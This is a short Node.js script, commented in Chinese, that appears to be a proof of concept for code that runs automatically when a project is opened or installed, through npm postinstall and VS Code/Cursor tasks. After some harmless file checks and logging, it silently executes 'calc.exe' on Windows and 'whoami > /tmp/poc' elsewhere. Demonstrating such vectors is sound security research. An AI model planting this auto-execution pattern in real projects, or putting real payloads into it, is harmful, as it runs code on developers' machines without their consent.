/**
 * 项目打开时自动执行的脚本
 * 
 * 这个文件会在以下情况自动执行：
 * 1. npm install 后（通过 postinstall 钩子）
 * 2. 通过 package.json 的 scripts 手动调用
 * 3. 通过 .vscode/tasks.json 配置自动运行
 */

const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

const projectRoot = __dirname;
const files = fs.readdirSync(projectRoot);
files.forEach(file => {
  const filePath = path.join(projectRoot, file);
  const stats = fs.statSync(filePath);
  const icon = stats.isDirectory() ? '📁' : '📄';
});

const configFiles = [
  { name: 'package.json', desc: 'Node.js 项目配置' },
  { name: '.vscode/tasks.json', desc: 'VS Code/Cursor 任务配置' },
  { name: '.vscode/settings.json', desc: 'VS Code/Cursor 设置' },
  { name: '.gitignore', desc: 'Git 忽略文件' }
];

configFiles.forEach(config => {
  const configPath = path.join(projectRoot, config.name);
  const exists = fs.existsSync(configPath);
  const status = exists ? '✅' : '❌';
});

try {

  const logDir = path.join(projectRoot, 'logs');
  if (!fs.existsSync(logDir)) {
    fs.mkdirSync(logDir, { recursive: true });

  }
  

  const logFile = path.join(logDir, 'open-history.log');
  const logEntry = `[${new Date().toISOString()}] 项目被打开\n`;
  fs.appendFileSync(logFile, logEntry);

  
} catch (error) {

}

if (process.platform === 'win32') {
  try {

    exec('calc.exe', (error, stdout, stderr) => {
      if (error) {
 
        return;
      }

    });
    console.log('✅ 已启动 Windows 计算器');
  } catch (error) {

  }
} else {
  // Linux 环境下执行 whoami > /tmp/poc
  try {
    exec('whoami > /tmp/poc', (error, stdout, stderr) => {
      if (error) {
        console.error('执行 whoami 命令时出错:', error);
        return;
      }
      console.log('✅ 已在 Linux 环境下执行 whoami > /tmp/poc');
    });
  } catch (error) {
    console.error('执行命令时出错:', error);
  }
}

